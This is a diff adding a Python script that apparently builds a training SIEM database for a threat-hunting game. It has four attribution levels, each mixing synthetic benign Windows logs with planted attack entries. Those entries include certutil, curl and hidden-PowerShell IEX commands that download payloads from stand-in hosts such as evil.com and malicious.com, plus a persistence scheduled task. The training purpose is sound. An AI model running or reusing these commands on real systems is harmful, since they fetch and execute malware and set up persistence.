@@ -1,0 +1,105 @@
+import sqlite3
+import random
+from datetime import datetime, timedelta
+
+def generate_benign_logs(num_logs, start_time):
+    logs = []
+    processes = [
+        ("svchost.exe", "System process execution", "Security", 4688),
+        ("chrome.exe", 'Process Create. CommandLine: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"', "Sysmon", 1),
+        ("explorer.exe", "Process Create. CommandLine: C:\\Windows\\Explorer.EXE", "Sysmon", 1),
+        ("msmpeng.exe", "ImageLoaded. Image: C:\\Windows\\System32\\ntdll.dll", "Sysmon", 7),
+        ("outlook.exe", "NetworkConnect. DestinationIp: 52.96.164.2, DestinationPort: 443", "Sysmon", 3)
+    ]
+    
+    current_time = start_time
+    for _ in range(num_logs):
+        current_time += timedelta(seconds=random.randint(1, 30))
+        proc = random.choice(processes)
+        logs.append({
+            "timestamp": current_time.strftime("%Y-%m-%dT%H:%M:%SZ"),
+            "event_id": proc[3],
+            "source": proc[2],
+            "process_name": proc[0],
+            "details": proc[1],
+            "is_malicious": False
+        })
+    return logs, current_time
+
+def init_db():
+    conn = sqlite3.connect('siem.db')
+    
+    with open('schema.sql', 'r') as f:
+        conn.executescript(f.read())
+        
+    cursor = conn.cursor()
+    
+    levels = [
+        (1, "Operation Kimsuky", "A suspicious document was opened, leading to abnormal activity. Find the linguistic artifacts.", "northkorea"),
+        (2, "Cozy Bear's Picnic", "An authorized application behaved strangely after a recent update. Examine the payload arguments.", "russia"),
+        (3, "Panda's Bamboo", "Data exfiltration suspected over port 443. Look for unique script execution names.", "china"),
+        (4, "Kitten's Claws", "Lateral movement detected. Check the scheduled tasks and commands executed.", "iran")
+    ]
+    
+    cursor.executemany("INSERT INTO levels (id, name, description, correct_attribution) VALUES (?, ?, ?, ?)", levels)
+    
+    all_logs = []
+    base_time = datetime(2024, 5, 14, 8, 0, 0)
+    
+    # Level 1: North Korea
+    b_logs, cur_time = generate_benign_logs(150, base_time)
+    for log in b_logs:
+        log["level_id"] = 1
+        all_logs.append(log)
+        
+    malicious_logs_l1 = [
+        {"level_id": 1, "timestamp": (cur_time + timedelta(seconds=10)).strftime("%Y-%m-%dT%H:%M:%SZ"), "event_id": 11, "source": "Sysmon", "process_name": "powershell.exe", "details": "FileCreate. TargetFilename: C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\kimsuky_updater.vbs", "is_malicious": True},
+        {"level_id": 1, "timestamp": (cur_time + timedelta(seconds=15)).strftime("%Y-%m-%dT%H:%M:%SZ"), "event_id": 1, "source": "Sysmon", "process_name": "wscript.exe", "details": 'Process Create. CommandLine: wscript.exe "C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\kimsuky_updater.vbs" /mode:silence /프로그람_갱신', "is_malicious": True}
+    ]
+    all_logs.extend(malicious_logs_l1)
+    b_logs, cur_time = generate_benign_logs(50, cur_time + timedelta(seconds=20))
+    for log in b_logs: log["level_id"] = 1; all_logs.append(log)
+
+    # Level 2: Russia
+    b_logs, cur_time = generate_benign_logs(150, base_time)
+    for log in b_logs: log["level_id"] = 2; all_logs.append(log)
+    malicious_logs_l2 = [
+        {"level_id": 2, "timestamp": (cur_time + timedelta(seconds=5)).strftime("%Y-%m-%dT%H:%M:%SZ"), "event_id": 1, "source": "Sysmon", "process_name": "cmd.exe", "details": 'Process Create. CommandLine: cmd.exe /c "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Users\\Public\\пароль.txt"', "is_malicious": True},
+        {"level_id": 2, "timestamp": (cur_time + timedelta(seconds=8)).strftime("%Y-%m-%dT%H:%M:%SZ"), "event_id": 1, "source": "Sysmon", "process_name": "powershell.exe", "details": 'Process Create. CommandLine: powershell.exe -ep bypass -f C:\\Users\\Public\\пароль.txt -Action "сохранить"', "is_malicious": True}
+    ]
+    all_logs.extend(malicious_logs_l2)
+    b_logs, cur_time = generate_benign_logs(50, cur_time + timedelta(seconds=20))
+    for log in b_logs: log["level_id"] = 2; all_logs.append(log)
+
+    # Level 3: China
+    b_logs, cur_time = generate_benign_logs(150, base_time)
+    for log in b_logs: log["level_id"] = 3; all_logs.append(log)
+    malicious_logs_l3 = [
+        {"level_id": 3, "timestamp": (cur_time + timedelta(seconds=5)).strftime("%Y-%m-%dT%H:%M:%SZ"), "event_id": 1, "source": "Sysmon", "process_name": "wmic.exe", "details": 'Process Create. CommandLine: wmic process call create "cmd.exe /c curl http://10.10.10.10/dl -o C:\\Temp\\下载.exe"', "is_malicious": True},
+        {"level_id": 3, "timestamp": (cur_time + timedelta(seconds=12)).strftime("%Y-%m-%dT%H:%M:%SZ"), "event_id": 1, "source": "Sysmon", "process_name": "下载.exe", "details": 'Process Create. CommandLine: C:\\Temp\\下载.exe --mode=stealth --密码=admin123', "is_malicious": True}
+    ]
+    all_logs.extend(malicious_logs_l3)
+    b_logs, cur_time = generate_benign_logs(50, cur_time + timedelta(seconds=20))
+    for log in b_logs: log["level_id"] = 3; all_logs.append(log)
+
+    # Level 4: Iran
+    b_logs, cur_time = generate_benign_logs(150, base_time)
+    for log in b_logs: log["level_id"] = 4; all_logs.append(log)
+    malicious_logs_l4 = [
+        {"level_id": 4, "timestamp": (cur_time + timedelta(seconds=5)).strftime("%Y-%m-%dT%H:%M:%SZ"), "event_id": 1, "source": "Sysmon", "process_name": "schtasks.exe", "details": 'Process Create. CommandLine: schtasks /create /tn "Microsoft\\Windows\\Update\\رمز" /tr "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString(\'http://malicious.com/payload.ps1\')" /sc minute /mo 5', "is_malicious": True}
+    ]
+    all_logs.extend(malicious_logs_l4)
+    b_logs, cur_time = generate_benign_logs(50, cur_time + timedelta(seconds=20))
+    for log in b_logs: log["level_id"] = 4; all_logs.append(log)
+
+    cursor.executemany(
+        "INSERT INTO logs (level_id, timestamp, event_id, source, process_name, details, is_malicious) VALUES (:level_id, :timestamp, :event_id, :source, :process_name, :details, :is_malicious)",
+        all_logs
+    )
+    
+    conn.commit()
+    conn.close()
+    print("Database initialized successfully.")
+
+if __name__ == '__main__':
+    init_db()
